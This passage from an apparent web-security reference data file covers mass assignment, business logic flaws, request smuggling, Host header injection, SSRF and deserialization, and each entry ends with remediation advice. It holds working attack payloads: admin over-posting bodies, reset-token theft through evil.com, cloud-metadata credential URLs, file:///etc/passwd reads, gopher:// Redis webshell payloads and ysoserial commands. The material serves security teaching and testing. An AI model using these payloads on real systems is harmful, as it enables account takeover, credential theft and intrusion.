              "Use a long, high-entropy random HMAC secret (or properly managed asymmetric keys); never a dictionary word or a value committed to source; rotate on suspicion.",
              "Validate all registered claims on every request — signature, exp, nbf, aud, and iss — and keep token lifetimes short with a refresh/revocation strategy for sensitive actions.",
              "Do not trust key-location headers (jku, x5u) unless the URL is strictly allow-listed to your own domain, and resolve kid only against a fixed internal key set (never a file path or DB query built from it).",
              "For logout/revocation needs, keep a server-side denylist or use short-lived tokens with refresh, since a pure stateless JWT cannot be revoked mid-lifetime."
            ]
          }
        ]
      },
      {
        id: "mass-assignment",
        name: "Mass Assignment",
        severity: "High",
        ref: "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html",
        description: "The app binds request fields straight to objects, letting attackers set properties they shouldn't control.",
        brief: "Mass assignment — also called auto-binding, over-posting, or (in the OWASP API Top 10) part of Broken Object Property Level Authorization — happens when a framework automatically maps the fields of an incoming request onto the properties of an internal object or database model. This binding is a convenience feature: instead of manually copying each field, the developer writes user.update(request.body) and the framework fills in everything that matches. The vulnerability is that 'everything that matches' includes properties the developer never intended a client to control.\n\nIf the model has sensitive attributes — isAdmin, role, groups, verified, balance, ownerId, id — and the binding is not restricted to a safe subset, an attacker simply adds those fields to the request. The framework dutifully sets them, turning an ordinary 'update my profile' endpoint into a privilege-escalation or data-tampering primitive. Because the read endpoint usually returns the full object, the attacker can learn exactly which fields exist and then over-post them on the next write.\n\nIt is especially common in frameworks that make binding effortless — Rails (before strong parameters), Spring MVC data binding, ASP.NET model binding, Laravel/Eloquent fillable, Django/DRF serializers with fields='__all__', and Node/Mongoose with unrestricted new Model(req.body). Impact: privilege escalation to admin, bypassing verification/approval gates, financial tampering, and reassigning object ownership.",
        quickReference: [
          { label: "Add a privileged field", cmd: "{\"username\":\"x\",\"email\":\"y\",\"isAdmin\":true}" },
          { label: "Escalate role on update", cmd: "PATCH /api/users/me  {\"role\":\"admin\"}" },
          { label: "Tamper server-owned fields", cmd: "\"balance\":100000   \"verified\":true   \"ownerId\":<victim>" },
          { label: "Discover fields", cmd: "GET the object / read JS to learn property names, then over-post them" }
        ],
        sections: [
          {
            title: "Root Cause & Concepts",
            type: "notes",
            items: [
              "The framework binds request keys to object properties by name, so any property that exists on the model is settable unless explicitly protected.",
              "The mismatch is between what the UI form offers (a few fields) and what the model exposes (all of them) — the server enforces the form's field set nowhere, only the client does.",
              "The read side leaks the target list: a GET that returns the full object hands the attacker every property name to try over-posting.",
              "It overlaps with IDOR/broken access control (setting ownerId or id) and with business logic (setting balance/price), but the mechanism is specifically the auto-binder trusting extra fields.",
              "Nested/relationship binding widens it: some frameworks bind related objects ({\"profile\":{\"role\":\"admin\"}}), reaching protected attributes indirectly."
            ]
          },
          {
            title: "Where to Look",
            type: "notes",
            items: [
              "Registration, profile update, and account-settings endpoints (set role/verified/isAdmin during create or update).",
              "Any create/update API that accepts a JSON or form body mapping to a domain object (users, orders, teams, subscriptions).",
              "Endpoints where the response object clearly has more fields than the form edits — the extra fields are the targets.",
              "Multi-tenant apps: tenantId/orgId over-posting to cross tenants; ownerId/userId to reassign records.",
              "Frameworks with a history of this: Rails, Spring, ASP.NET, Laravel Eloquent, Django REST Framework, Mongoose."
            ]
          },
          {
            title: "Step 1 — Enumerate the Object's Fields",
            type: "commands",
            commands: [
              { label: "Read the full object", cmd: "GET /api/users/me\n# {\"id\":7,\"username\":\"x\",\"email\":\"y\",\"role\":\"user\",\"verified\":false,\"balance\":0,...}\n# every property here is a candidate to over-post on a write" },
              { label: "Harvest names from other sources", cmd: "# admin API responses, JS bundles/models, API docs/Swagger, and error messages\n# often reveal fields the normal user object hides (isAdmin, permissions[])" },
              { label: "Note naming conventions", cmd: "# guess siblings of known fields: is_admin/isAdmin/admin, role/roles/roleId,\n# verified/isVerified/emailVerified, active/enabled/status" }
            ]
          },
          {
            title: "Step 2 — Over-post & Confirm",
            type: "commands",
            commands: [
              { label: "Escalate privilege on write", cmd: "PATCH /api/users/me\n{\"email\":\"y@corp\",\"role\":\"admin\"}\n{\"username\":\"x\",\"isAdmin\":true}\n{\"permissions\":[\"*\"],\"groups\":[\"admins\"]}\n# accepted and persisted = mass assignment" },
              { label: "Bypass gates & tamper data", cmd: "{\"verified\":true}       # skip email/KYC verification\n{\"approved\":true}       # skip an approval workflow\n{\"balance\":1000000}     # financial tampering\n{\"price\":0}             # order manipulation" },
              { label: "Reassign ownership / cross-tenant", cmd: "{\"ownerId\":<victim-id>}     # take over / plant a record\n{\"userId\":<other-user>}     # attach your action to someone else\n{\"tenantId\":<other-org>}    # cross tenant boundary\n{\"id\":<other-record>}       # overwrite a different object" },
              { label: "Nested / relationship binding", cmd: "# where direct fields are protected, try the object graph:\n{\"profile\":{\"user\":{\"roles\":[\"admin\"]}}}\n{\"role_attributes\":{\"name\":\"admin\"}}" },
              { label: "Confirm persistence", cmd: "GET /api/users/me   ->  \"role\":\"admin\"\n# then exercise the new privilege to prove impact" }
            ]
          },
          {
            title: "Fields Worth Injecting",
            type: "table",
            columns: ["Field", "Effect"],
            rows: [
              ["role / isAdmin / groups / permissions", "Privilege escalation to administrator"],
              ["verified / approved / active / status", "Bypass verification or approval gates"],
              ["balance / price / credit / discount", "Financial tampering"],
              ["ownerId / userId / tenantId", "Reassign ownership / cross a tenant boundary"],
              ["id / uuid", "Overwrite or collide with a different record"],
              ["emailVerified / mfaEnabled", "Weaken account-security state"]
            ]
          },
          {
            title: "Impact & Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "GET the object to learn its fields", "List of server-owned properties"],
              ["2", "Over-post a privileged field on create/update", "Server binds it blindly"],
              ["3", "Re-GET to confirm persistence", "Field is set on the record"],
              ["4", "Use the new state (role / ownership / balance)", "Privilege escalation, takeover, or fraud"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite (Repeater)", "Add extra fields to requests and confirm binding/persistence"],
              ["Postman / curl", "Craft JSON/form bodies with additional properties"],
              ["Param Miner (Burp)", "Discover hidden/accepted parameter names"],
              ["Swagger/OpenAPI & JS review", "Enumerate model field names to target"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "OWASP — Mass Assignment Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html" },
              { label: "OWASP API Security — Broken Object Property Level Authorization (API3:2023)", url: "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/" },
              { label: "PayloadsAllTheThings — Mass Assignment", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%20Assignment" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Bind requests to an explicit allow-list DTO / view model that contains ONLY the fields a client may set — never bind directly to the database entity.",
              "Use the framework's field-whitelisting: Rails strong parameters (permit), Spring @InitBinder/setAllowedFields or a dedicated DTO, ASP.NET [Bind]/BindNever, Laravel $fillable (not $guarded blanket), Django/DRF explicit serializer fields (never fields='__all__'), Mongoose explicit field assignment.",
              "Set sensitive fields (role, owner, tenant, price, verified) only in server-side code after an authorization check — never from request binding.",
              "Separate read models from write models so the shape of the response never dictates what is writable.",
              "Default to deny: new model properties should be non-bindable unless explicitly added to the allow-list.",
              "Add automated tests that attempt to over-post privileged fields (isAdmin, role, ownerId) and assert the server ignores them."
            ]
          }
        ]
      },
      {
        id: "business-logic",
        name: "Business Logic Flaws",
        severity: "Medium",
        ref: "https://portswigger.net/web-security/logic-flaws",
        description: "The application enforces its rules incorrectly, letting valid requests achieve invalid outcomes.",
        brief: "Business logic flaws are failures in how an application's rules and workflows are enforced, rather than a classic injection or encoding bug. Every request may be individually well-formed, yet the sequence or combination produces an outcome the business never intended — a negative quantity that credits money, a coupon applied infinitely, a step skipped, a limit not enforced server-side.\n\nImpact: financial loss, policy and entitlement bypass, and data-integrity damage. They are invisible to scanners because nothing is malformed; finding them requires understanding what the application is supposed to guarantee and then breaking that assumption.",
        quickReference: [
          { label: "Value manipulation", cmd: "quantity=-1   price=0   currency swap   over-long/negative inputs" },
          { label: "Step skipping", cmd: "Jump straight to the confirmation/fulfilment endpoint" },
          { label: "Limit abuse", cmd: "Reuse a one-time coupon / referral; exceed a per-account cap" },
          { label: "State confusion", cmd: "Cancel-after-fulfil, refund + keep, concurrent requests (see Race Conditions)" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Model what the workflow must guarantee", cmd: "# write down the invariant, then attack it:\n#   'total charged = sum(item price x qty)'  -> break with qty=-1\n#   'a coupon is single-use'                 -> replay it\n#   'you must pay before fulfilment'         -> skip the pay step" },
              { label: "2. Tamper every value", cmd: "# negative / zero / huge / wrong-type / someone-else's:\nquantity=-1        # negative qty can credit money back\nprice=0            # client-sent price trusted?\ncurrency=IDR->USD  # unit/currency confusion on the total" },
              { label: "3. Reorder and skip steps", cmd: "# call the fulfilment/confirmation endpoint directly, before payment:\nPOST /checkout/complete?order=123   # reached without the pay step?\n# replay steps out of sequence to land in a state the design forbids" },
              { label: "4. Abuse limits and single-use items", cmd: "# reuse a one-time coupon / referral code:\nfor i in 1..100: POST /cart/apply-coupon  code=WELCOME10\n# exceed per-account caps, stack discounts, farm referral credit" },
              { label: "5. Break assumptions with concurrency", cmd: "# fire simultaneous requests to defeat a 'once only' check:\n# 20x parallel  POST /redeem  giftcard=ABC   (see Race Conditions)\n# double-spend, over-withdraw, apply a balance twice" }
            ]
          },
          {
            title: "Common Patterns",
            type: "table",
            columns: ["Pattern", "Example"],
            rows: [
              ["Trusting client values", "Price/discount/total computed or sent by the client and accepted"],
              ["Missing server-side limits", "Quantity, balance, or rate checks only enforced in the UI"],
              ["Workflow step skipping", "Reaching a later state without completing required prior steps"],
              ["Insufficient validation", "Negative numbers, integer overflow, currency or unit confusion"],
              ["Assumption breaking", "Doing steps out of order, or in parallel, in ways the design never expected"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Model the workflow's intended guarantee", "A concrete invariant to break"],
              ["2", "Tamper values / skip steps / reuse limits", "An invalid but accepted request"],
              ["3", "Observe the unintended outcome", "Free goods / bypassed policy"],
              ["4", "Repeat / automate at scale", "Material fraud or loss"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite (Repeater/Turbo Intruder)", "Value tampering, step replay, high-rate concurrency"],
              ["Manual analysis", "Model workflow intent and abuse cases"],
              ["curl / scripts", "Reproduce out-of-order and parallel request sequences"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — Business logic vulnerabilities", url: "https://portswigger.net/web-security/logic-flaws" },
              { label: "OWASP — Testing for Business Logic", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Enforce all business rules server-side; treat the client as untrusted for prices, totals, quantities, and state.",
              "Recompute security- and money-relevant values on the server from trusted data, never accept them from the request.",
              "Validate value ranges and types strictly (no negatives where nonsensical, no overflow).",
              "Enforce workflow order and idempotency server-side; verify each step's preconditions.",
              "Threat-model each critical workflow and add abuse-case tests — scanners will not find these for you."
            ]
          }
        ]
      }
    ]
  },
    {
    category: "Server-Side",
    vulns: [
      {
        "id": "http-request-smuggling",
        "name": "HTTP Request Smuggling",
        "severity": "High",
        "ref": "https://portswigger.net/web-security/request-smuggling",
        "description": "A front-end and back-end server disagree on where a request ends, letting an attacker smuggle a hidden request that affects other users.",
        "brief": "When traffic passes through a chain of servers (CDN/proxy in front of an application server), both must agree on each request's boundary. If one uses the Content-Length header and the other uses Transfer-Encoding: chunked - and they can be made to disagree - an attacker can append a partial 'smuggled' request that the back-end treats as the start of the next user's request.\n\nImpact: capturing other users' requests (including their cookies/credentials), poisoning responses served to them, bypassing front-end security controls, and turning a reflected issue into a widespread one. The main variants are CL.TE, TE.CL, and TE.TE.",
        "quickReference": [
          { "label": "CL.TE - front-end uses Content-Length", "cmd": "Content-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG   (the 'G' is prepended to the next request)" },
          { "label": "TE.CL - front-end uses Transfer-Encoding", "cmd": "Content-Length: 3\nTransfer-Encoding: chunked\n\n<chunk sizes crafted so the back-end stops early>" },
          { "label": "TE.TE - obfuscate the header", "cmd": "Transfer-Encoding: xchunked  /  Transfer-Encoding:[tab]chunked  (one server ignores it)" },
          { "label": "Detect safely", "cmd": "use Burp Suite + the HTTP Request Smuggler extension (timing-based probes)" }
        ],
        "sections": [
          { "title": "How It's Exploited", "type": "commands", "commands": [
            { "label": "1. Detect with a timing probe", "cmd": "# send a request that, if smuggling works, makes the back-end wait for more data\n# a delayed response indicates a desync. Burp 'HTTP Request Smuggler' automates this\n# CL.TE detection body:\nContent-Length: 4\nTransfer-Encoding: chunked\n\n1\nA\nX" },
            { "label": "2. Confirm with a smuggled prefix", "cmd": "# smuggle the start of a request so the NEXT visitor's request is appended to it\n# e.g. force their request onto an endpoint you control and observe the effect" },
            { "label": "3. Weaponise", "cmd": "# capture another user's request (steal cookies), or\n# poison the response queue so victims receive your response, or\n# bypass a front-end WAF/auth check by hiding the real request from it" }
          ]},
          { "title": "Variants & Impact", "type": "table", "columns": ["Variant", "Cause / Impact"], "rows": [
            ["CL.TE", "Front-end uses Content-Length, back-end uses Transfer-Encoding"],
            ["TE.CL", "Front-end uses Transfer-Encoding, back-end uses Content-Length"],
            ["TE.TE", "Both support TE but one is tricked into ignoring an obfuscated header"],
            ["Impact - request capture", "Steal victims' cookies/credentials from their requests"],
            ["Impact - response poisoning", "Serve attacker content to other users"],
            ["Impact - control bypass", "Hide a request from the front-end WAF/auth layer"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "PortSwigger - HTTP request smuggling", "url": "https://portswigger.net/web-security/request-smuggling" },
            { "label": "HTTP Request Smuggler (Burp extension)", "url": "https://github.com/PortSwigger/http-request-smuggler" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Make the whole chain handle request boundaries identically - ideally use HTTP/2 end to end and downgrade carefully.",
            "Configure the front-end to normalise ambiguous requests and reject any with both Content-Length and Transfer-Encoding.",
            "Reject malformed or obfuscated Transfer-Encoding headers rather than trying to interpret them.",
            "Disable connection reuse to the back-end where feasible, so a smuggled prefix cannot bleed into another user's request.",
            "Keep proxies, load balancers, and application servers patched - many desync bugs are fixed at that layer."
          ]}
        ]
      },
      {
        "id": "host-header-injection",
        "name": "Host Header Injection",
        "severity": "Medium",
        "ref": "https://portswigger.net/web-security/host-header",
        "description": "The application trusts the client-supplied Host (or X-Forwarded-Host) header to build URLs or route logic, enabling poisoning and token theft.",
        "brief": "The HTTP Host header is attacker-controllable, yet many applications reuse it to build absolute URLs — most damagingly the link in a password-reset email. If the reset URL is constructed from the Host or X-Forwarded-Host header, an attacker can request a reset for a victim while supplying their own host, so the email arrives with a link (carrying the victim's valid token) pointing at the attacker's server. The token leaks the moment the victim clicks.\n\nOther impacts include web-cache poisoning, routing to an unintended virtual host, and Host-based access-control bypass.",
        "quickReference": [
          { "label": "Password-reset poisoning", "cmd": "POST /reset  Host: evil.com        # reset link emailed to the victim points at evil.com" },
          { "label": "Override header variant", "cmd": "X-Forwarded-Host: evil.com   (also X-Host, X-Forwarded-Server, Forwarded)" },
          { "label": "Duplicate / ambiguous Host", "cmd": "Host: target.com\\r\\nHost: evil.com   (front-end reads one, back-end the other)" },
          { "label": "Absolute-URL request line", "cmd": "GET https://target.com/  with  Host: evil.com" }
        ],
        "sections": [
          { "title": "How It's Exploited", "type": "commands", "commands": [
            { "label": "1. Confirm the Host is reflected / used", "cmd": "curl -s https://target/ -H 'Host: evil.com' | grep -i 'evil.com'\n# reflected into a link, redirect, or absolute URL = candidate" },
            { "label": "2. Poison a password reset", "cmd": "POST /forgot-password HTTP/1.1\nHost: evil.com\n\nemail=victim@target.com\n# the victim receives a reset mail whose link is https://evil.com/reset?token=<victim token>" },
            { "label": "3. Try override headers when Host is validated", "cmd": "POST /forgot-password HTTP/1.1\nHost: target.com\nX-Forwarded-Host: evil.com\n\nemail=victim@target.com" },
            { "label": "4. Capture the token", "cmd": "# run a listener on evil.com; when the victim clicks, the token hits your logs:\n# GET /reset?token=eyJ...  -> use it to set the victim's password" }
          ]},
          { "title": "Impacts", "type": "table", "columns": ["Abuse", "Result"], "rows": [
            ["Password-reset poisoning", "Reset token leaked -> account takeover"],
            ["Web-cache poisoning", "Malicious absolute URLs served to other users"],
            ["Routing / vhost confusion", "Reach an internal or unintended application"],
            ["Host-based auth bypass", "Spoof a trusted host to reach restricted areas"],
            ["SSRF-style callbacks", "Coerce server-side requests to an attacker host"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "PortSwigger — HTTP Host header attacks", "url": "https://portswigger.net/web-security/host-header" },
            { "label": "PortSwigger — Password reset poisoning", "url": "https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Never build absolute URLs (especially reset/verification links) from the Host or X-Forwarded-Host header — use a server-side configured canonical domain.",
            "Validate the incoming Host against an allow-list of expected domains and reject anything else.",
            "Strip or ignore X-Forwarded-Host and similar override headers unless they come from a trusted, authenticated proxy.",
            "Reject requests with duplicate or malformed Host headers.",
            "Scope reset tokens tightly (short expiry, single use, bound to the account) to limit the damage if a link leaks."
          ]}
        ]
      },
      {
        id: "ssrf",
        name: "Server-Side Request Forgery (SSRF)",
        severity: "High",
        ref: "https://portswigger.net/web-security/ssrf",
        description: "The server is tricked into making requests to attacker-chosen URLs, reaching internal services and cloud metadata.",
        brief: "Server-Side Request Forgery occurs when an application makes an HTTP (or other-protocol) request to a URL that the user supplies or influences, without restricting where that request may go. The attacker substitutes an internal, loopback, or metadata target, and the server — which usually sits inside the trust boundary the attacker cannot reach directly — dutifully makes the request and, in many cases, returns the response. In effect the server becomes a proxy into its own network.\n\nSSRF has two forms. In basic (in-band) SSRF the response body comes back to the attacker, enabling direct reading of internal pages and services. In blind SSRF nothing is reflected, so the attacker confirms the request out-of-band (a DNS/HTTP callback) and exploits it via side effects, timing, and known endpoints. Both are dangerous; blind SSRF is often dismissed but still reaches cloud metadata and internal APIs.\n\nThe impact is heaviest in cloud environments. The link-local metadata endpoint (169.254.169.254 on AWS/GCP/Azure/DO) hands temporary IAM credentials, instance identity, and user-data to anything that can reach it — so an SSRF frequently escalates straight to cloud account compromise. Beyond that: internal service and admin-panel access, port scanning of the internal network via response/timing differences, reading files via file://, and — with gopher:// — crafting arbitrary TCP payloads to talk to Redis, databases, or SMTP for stored RCE. It hides in any URL-fetching feature: webhooks, link previews and unfurlers, 'import from URL', PDF/screenshot/HTML renderers, avatar-by-URL, XML/SVG parsers (see XXE), and document converters.",
        quickReference: [
          { label: "Cloud metadata (AWS IMDSv1)", cmd: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
          { label: "Internal / loopback", cmd: "http://127.0.0.1:8080/   http://localhost/admin   http://10.0.0.5/" },
          { label: "Filter bypasses", cmd: "http://127.1   http://0177.0.0.1   http://2130706433   http://[::1]   DNS rebinding" },
          { label: "Blind confirm", cmd: "Point at a Collaborator/interactsh host; a callback proves the server fetched it" }
        ],
        sections: [
          {
            title: "Root Cause & Concepts",
            type: "notes",
            items: [
              "The app treats a user-influenced value as a URL to fetch and does not constrain the destination — so the attacker chooses where the server's trusted network position is aimed.",
              "In-band vs blind: if the fetched body (or an error/redirect based on it) comes back, you read internal responses directly; if not, you confirm via OOB callback and exploit through side effects and known endpoints.",
              "The server's requests originate inside the perimeter, so they bypass network ACLs, reach RFC1918/loopback hosts, and — critically — the cloud metadata service that trusts any local caller.",
              "Partial SSRF still matters: even controlling only the host, path, or a redirect target can be enough to reach metadata or an internal API.",
              "Non-HTTP schemes widen impact: file:// reads files, dict://redis or gopher:// can send crafted bytes to internal TCP services (Redis, memcached, SMTP, DB) for data theft or stored RCE."
            ]
          },
          {
            title: "Where to Look",
            type: "notes",
            items: [
              "Explicit URL inputs: webhooks, 'import/fetch from URL', RSS/feed readers, link preview/unfurl (chat, social), avatar or image 'by URL', and callback/notification URLs.",
              "Document & media processors: HTML-to-PDF, screenshotting, image thumbnailers, and anything that renders remote resources (a remote <img>/<link> in HTML you supply).",
              "Parsers that fetch: XML/SVG (XXE), and any templating that can include remote content.",
              "Hidden URL params: a full URL is not required — host, domain, path, or port fields, and parameters that get concatenated into a server-side request.",
              "APIs that proxy or validate remote endpoints ('test this integration', 'verify this callback'), and SSO/OAuth flows that fetch remote metadata/JWKS URLs."
            ]
          },
          {
            title: "Step 1 — Find & Confirm the Sink",
            type: "commands",
            commands: [
              { label: "Point a fetch feature inward", cmd: "POST /api/import {\"url\":\"https://example.com/x\"}\n# swap the value and watch the response body / status / timing:\n{\"url\":\"http://127.0.0.1/\"}\n{\"url\":\"http://localhost:8080/\"}" },
              { label: "Confirm (esp. blind) with OOB", cmd: "{\"url\":\"http://YOURID.oast.site/\"}\n# a DNS or HTTP hit on interactsh/Collaborator proves the server made the request\n# even when nothing is reflected" },
              { label: "Distinguish in-band vs blind", cmd: "# in-band: the internal page's HTML/JSON comes back to you\n# blind: only a callback fires -> pivot via known endpoints & timing" },
              { label: "Detect via error/timing", cmd: "# closed internal port -> fast connection-refused error\n# open internal port -> slow read/hang or a different error\n# this difference is an internal port scanner" }
            ]
          },
          {
            title: "Step 2 — Exploit: Metadata, Internal, Files",
            type: "commands",
            commands: [
              { label: "AWS metadata -> IAM credentials", cmd: "# IMDSv1 (no token) — read the role, then its temp keys:\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/<role>\n# returns AccessKeyId / SecretAccessKey / Token -> use as the instance role" },
              { label: "IMDSv2 (needs a PUT token first)", cmd: "# if the SSRF can set headers/method, get a token then use it:\nPUT http://169.254.169.254/latest/api/token  X-aws-ec2-metadata-token-ttl-seconds: 21600\nGET http://169.254.169.254/latest/meta-data/  X-aws-ec2-metadata-token: <token>" },
              { label: "GCP / Azure metadata", cmd: "# GCP (needs header):\nhttp://metadata.google.internal/computeMetadata/v1/  (Metadata-Flavor: Google)\n# Azure:\nhttp://169.254.169.254/metadata/instance?api-version=2021-02-01  (Metadata: true)" },
              { label: "Internal services & files", cmd: "http://127.0.0.1:8080/          # local admin app\nhttp://10.0.0.5/actuator/env    # Spring Boot secrets\nhttp://127.0.0.1:6379/          # Redis (via gopher:// for real commands)\nfile:///etc/passwd              # local file read where file:// is allowed" },
              { label: "gopher:// for arbitrary TCP (stored RCE)", cmd: "# craft raw bytes to an internal service, e.g. Redis -> write a cron/webshell\ngopher://127.0.0.1:6379/_<URL-encoded Redis protocol>\n# Gopherus generates these payloads for Redis, MySQL, SMTP, FastCGI, etc." }
            ]
          },
          {
            title: "Step 3 — Filter & SSRF-Protection Bypass",
            type: "commands",
            commands: [
              { label: "IP-format tricks for 127.0.0.1", cmd: "http://127.1                 # short form\nhttp://0177.0.0.1            # octal\nhttp://2130706433            # decimal\nhttp://0x7f.0.0.1            # hex\nhttp://[::1]  http://[::ffff:127.0.0.1]   # IPv6\nhttp://127.0.0.1.nip.io      # wildcard DNS -> 127.0.0.1" },
              { label: "Defeat allow-lists", cmd: "# put the allowed host in the wrong place:\nhttp://allowed.com@127.0.0.1/        # userinfo\nhttp://127.0.0.1#allowed.com\nhttp://127.0.0.1%2f%2f@allowed.com\n# attacker domain that RESOLVES to an internal IP\n# allowed host with an open redirect -> redirected inward" },
              { label: "DNS rebinding (TOCTOU)", cmd: "# host a name that resolves public on the validation check,\n# then internal on the actual fetch (low TTL) -> passes the check, hits internal\n# services like rbndr / your own DNS with rotating answers" },
              { label: "Scheme & parser tricks", cmd: "# if http is blocked, try file:// gopher:// dict:// ftp:// ldap://\n# case & encoding: HTTP://, %68ttp, double-encoding\n# 30x redirect from your server to the internal target" }
            ]
          },
          {
            title: "Filter Bypass Reference",
            type: "table",
            columns: ["Defence", "Bypass"],
            rows: [
              ["Block 'localhost'/127.0.0.1", "127.1, 0.0.0.0, 0177.0.0.1 (octal), 2130706433 (decimal), 0x7f.0.0.1, [::1], 127.0.0.1.nip.io"],
              ["Allow-list a domain", "allowed@internal (userinfo), #/%23 fragment tricks, sub.attacker.com resolving to an internal IP"],
              ["Validate then fetch", "DNS rebinding / TOCTOU; open redirect on the allowed host"],
              ["Block http/https only", "file://, gopher://, dict://, ftp:// where the HTTP client supports them"],
              ["IMDSv1 assumed", "Enforce IMDSv2, but SSRF that controls method+headers can still mint a token"]
            ]
          },
          {
            title: "Impact & Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find a URL-fetching feature", "Candidate SSRF sink"],
              ["2", "Confirm in-band read or OOB callback", "Server makes attacker-chosen requests"],
              ["3", "Hit cloud metadata", "Temporary IAM credentials stolen"],
              ["4", "Enumerate/read internal services", "Internal recon, admin panels, secrets"],
              ["5", "gopher:// to Redis/DB, or use stolen creds", "Stored RCE / cloud account takeover"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite + Collaborator", "Manual probing and blind-SSRF OOB detection"],
              ["interactsh", "Standalone out-of-band callback server for blind confirmation"],
              ["SSRFmap", "Automate SSRF exploitation across known modules (metadata, redis, etc.)"],
              ["Gopherus", "Generate gopher:// payloads for Redis, MySQL, SMTP, FastCGI"],
              ["rbndr / DNS rebinding services", "TOCTOU bypass of resolve-then-fetch validation"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — SSRF (with labs)", url: "https://portswigger.net/web-security/ssrf" },
              { label: "OWASP — SSRF Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" },
              { label: "OWASP WSTG — Testing for SSRF", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery" },
              { label: "PayloadsAllTheThings — SSRF", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Allow-list the exact hosts, ports, and schemes the feature legitimately needs and deny everything else — an allow-list is far safer than trying to blacklist internal ranges.",
              "Resolve the hostname yourself, verify the resolved IP is a permitted public address (reject loopback, link-local 169.254.0.0/16, and RFC1918), then connect to that IP — and re-validate on every redirect to defeat DNS rebinding, or disable redirects entirely.",
              "Do not return the raw fetched response or upstream error to the user where avoidable, to blunt in-band data exfiltration.",
              "In AWS, enforce IMDSv2 (session-token, hop-limit 1) and, better, block egress to 169.254.169.254 from application subnets; apply the equivalent metadata hardening on GCP/Azure.",
              "Run the fetching component in a segmented network with strict egress filtering so even a successful SSRF cannot reach sensitive internal services.",
              "Disable unneeded URL schemes in the HTTP client (no file://, gopher://, dict://) and set sane timeouts and response-size limits."
            ]
          }
        ]
      },
      {
        id: "insecure-deserialization",
        name: "Insecure Deserialization",
        severity: "Critical",
        ref: "https://portswigger.net/web-security/deserialization",
        description: "Deserializing attacker-controlled data instantiates dangerous object graphs, often leading to RCE.",
        brief: "Serialization converts an in-memory object into a portable byte stream or string; deserialization reconstructs the object from that data. The vulnerability arises when an application deserializes data that an attacker can influence, because native deserializers do far more than copy fields — they instantiate classes and invoke lifecycle methods (readObject, __wakeup, __destruct, __reduce__) during reconstruction. If the runtime's classpath contains suitable 'gadget' classes, a carefully crafted object graph chains those method calls together into an arbitrary effect, most often command execution.\n\nCrucially, the attacker does not need the application's own classes to be exploitable — the gadgets come from common libraries already present (Apache Commons Collections, Spring, Groovy in Java; a wide range of framework classes in .NET, PHP, and Python). This is why a single deserialization of untrusted input is treated as critical: the sink plus a vulnerable library on the path is enough.\n\nIt affects Java (ObjectInputStream), .NET (BinaryFormatter, __VIEWSTATE, Json.NET with TypeNameHandling), PHP (unserialize object injection), Python (pickle/PyYAML), Ruby (Marshal/YAML), and Node (a handful of libraries). Impact is remote code execution as the app process, and — even short of RCE — authentication and logic bypass by tampering with serialized fields (roles, prices, user ids). It is dangerous because the data rides in ordinary places: cookies, hidden form fields, ViewState, API bodies, message-queue payloads, and uploaded files, usually with no special privilege required.",
        quickReference: [
          { label: "Java blob (spot it)", cmd: "Base64 starting rO0AB...   raw bytes AC ED 00 05" },
          { label: "Generate a Java gadget", cmd: "java -jar ysoserial.jar CommonsCollections5 \"id\" | base64 -w0" },
          { label: "Safe detection (no RCE)", cmd: "ysoserial URLDNS \"http://you.oastify.com\"  -> a DNS hit confirms the sink" },
          { label: "PHP / .NET / Python tells", cmd: "O:4:\"User\": (PHP)   __VIEWSTATE= (.NET)   base64 gASV / \\x80\\x04 (pickle)" }
        ],
        sections: [
          {
            title: "Root Cause & Mechanism",
            type: "notes",
            items: [
              "Native deserializers rebuild arbitrary object types and run their magic/lifecycle methods automatically — so control of the input is control over which objects get constructed and which methods fire.",
              "A gadget chain strings together method calls that each library author intended for benign use, but which combine to reach a sink like Runtime.exec, ProcessBuilder, or eval — the attacker supplies the object graph, the libraries supply the code.",
              "You do not need source access or the app's own classes: the chain is built from dependencies already on the classpath, which is why generic tools (ysoserial, phpggc) work across targets.",
              "Format tells: Java raw AC ED 00 05 / base64 rO0AB; PHP a:/O: strings from serialize(); .NET __VIEWSTATE and BinaryFormatter blobs; Python pickle opcodes (\\x80); Ruby Marshal \\x04\\x08.",
